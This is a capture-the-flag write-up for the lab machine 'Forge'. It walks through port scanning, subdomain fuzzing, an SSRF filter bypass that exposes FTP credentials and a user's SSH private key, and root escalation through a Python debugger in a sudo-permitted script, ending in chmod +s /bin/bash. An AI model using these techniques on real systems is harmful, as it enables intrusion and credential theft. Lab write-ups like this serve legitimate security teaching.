## Enumeration

`nmap -A 10.10.11.111`

```bash            
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 10:01 EST
Nmap scan report for 10.10.11.111 (10.10.11.111)
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web

We find a upload functionality for images. Since the server runs and checks the image type to correctly display images, a known way to bypass this is to embed the payload to an actual image. Trying this trick didn't work for me so I moved on.

## Host Enumeration
```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/shubs-subdomains.txt -u http://forge.htb/ -H “Host: FUZZ.forge.htb” -t 200 -fl 10
```

```bash
admin [Status: 200, Size: 27, Words: 4, Lines: 2]
```

Visiting the subdomain we get a text "Only localhost is allowed! ".

Back to the `forge.htb` endpoint we use the "Upload from url" functionality and try to access the `admin.forge.htb` subdomain. However we get a text response "URL contains a blacklisted address!". To bypass this we use the url with all caps `http://ADMIN.FORGE.HTB`.

Since there's no image that we can view on the subdomain we get the same message as before. However using `curl` to this link `curl http://forge.htb/uploads/R7Dl5h466PkWBgNjh0mx` we get to bypass and directly read information on the admin index panel.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```  

There we find the path `/announcements`. We use the same methodology to curl this location.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html> 
```

Now we have disclosed ftp creds user:heightofsecurity123! and information on how to use them with the "upload from url" functionality.
```bash
http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB
```

Now curl the given path like before `curl http://forge.htb/uploads/ZEx8iXtaA8u4avWu8HBM`

```html
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Dec 27 07:36 user.txt
```

Now it seems that we are in the user directory and we know that ssh is open so will try to get the user's id_rsa next.

With the same methodology upload this `http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa` and curl the response.

Now we can connect to user `ssh user@forge.htb -i id_rsa`

## Privilege Escalation

```bash
sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

The contents of the script

```bash
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()

```

Ok so running this script on the current session we'll listen on a random port on localhost. Then we can connect to the port on the localhost from another ssh session and provide the clear-text admin password. From there we need to send wrong input to launch the python debugger on the first ssh session and run commands on it. Commands to run:

```bash
import os
os.system('chmod +s /bin/bash')
exit
```

Now we can elevate to root with `bash -p`
